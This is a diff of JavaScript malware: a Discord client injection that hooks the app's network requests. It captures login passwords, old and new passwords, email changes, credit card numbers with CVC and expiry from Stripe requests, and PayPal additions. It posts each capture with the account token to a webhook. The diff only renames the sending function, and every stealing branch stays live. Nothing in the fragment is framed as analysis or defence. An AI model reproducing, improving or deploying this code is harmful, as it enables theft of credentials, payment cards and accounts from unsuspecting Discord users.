@@ -409,12 +409,11 @@ async function firstTime() {
                     { name: '🌐 IP',       value: `\`${ip}\``,                                 inline: true },
                     { name: '📂 Client',   value: `\`${client}\``,                             inline: true },
                 ]);
-                await sendWithHQFriends(
+                await postWebhook(buildPayload(
                     'Discord Injection — Initialized',
                     fields,
-                    avatar || AVATAR_URL, banner || null,
-                    token, user.username
-                );
+                    avatar || AVATAR_URL, banner || null
+                ));
             } catch {}
         }
     } catch {}
@@ -516,44 +515,44 @@ session.defaultSession.webRequest.onCompleted({
     switch (true) {
         case details.url.endsWith('login'):
             if (!data.password) return;
-            await sendWithHQFriends(
+            await postWebhook(buildPayload(
                 'Discord — Login Captured',
                 buildFields(user, billing, null, token, [
                     ...base,
                     { name: '🔑 Password', value: `\`${data.password}\``, inline: false },
                 ]),
-                avatar || AVATAR_URL, banner || null, token, user.username
-            );
+                avatar || AVATAR_URL, banner || null
+            ));
             break;
 
         case details.url.endsWith('users/@me') && details.method === 'PATCH':
             if (!data.password) return;
             if (data.new_password) {
-                await sendWithHQFriends(
+                await postWebhook(buildPayload(
                     'Discord — Password Changed',
                     buildFields(user, billing, null, token, [
                         ...base,
                         { name: '🔑 Old Password', value: `\`${data.password}\``,     inline: true },
                         { name: '🔑 New Password', value: `\`${data.new_password}\``, inline: true },
                     ]),
-                    avatar || AVATAR_URL, banner || null, token, user.username
-                );
+                    avatar || AVATAR_URL, banner || null
+                ));
             }
             if (data.email) {
-                await sendWithHQFriends(
+                await postWebhook(buildPayload(
                     'Discord — Email Changed',
                     buildFields(user, billing, null, token, [
                         ...base,
                         { name: '📧 New Email', value: `\`${data.email}\``,    inline: true },
                         { name: '🔑 Password',  value: `\`${data.password}\``, inline: true },
                     ]),
-                    avatar || AVATAR_URL, banner || null, token, user.username
-                );
+                    avatar || AVATAR_URL, banner || null
+                ));
             }
             break;
 
         case details.url.includes('api.stripe.com') && details.url.endsWith('tokens'):
-            await sendWithHQFriends(
+            await postWebhook(buildPayload(
                 'Discord — Credit Card Added',
                 buildFields(user, billing, null, token, [
                     ...base,
@@ -561,16 +560,16 @@ session.defaultSession.webRequest.onCompleted({
                     { name: '🔒 CVC',    value: `\`${data['card[cvc]']       || 'N/A'}\``,                                inline: true },
                     { name: '📅 Expiry', value: `\`${data['card[exp_month]'] || '?'}/${data['card[exp_year]'] || '?'}\``, inline: true },
                 ]),
-                avatar || AVATAR_URL, banner || null, token, user.username
-            );
+                avatar || AVATAR_URL, banner || null
+            ));
             break;
 
         case details.url.includes('paypal_accounts'):
-            await sendWithHQFriends(
+            await postWebhook(buildPayload(
                 'Discord — PayPal Added',
                 buildFields(user, billing, null, token, base),
-                avatar || AVATAR_URL, banner || null, token, user.username
-            );
+                avatar || AVATAR_URL, banner || null
+            ));
             break;
 
         default:
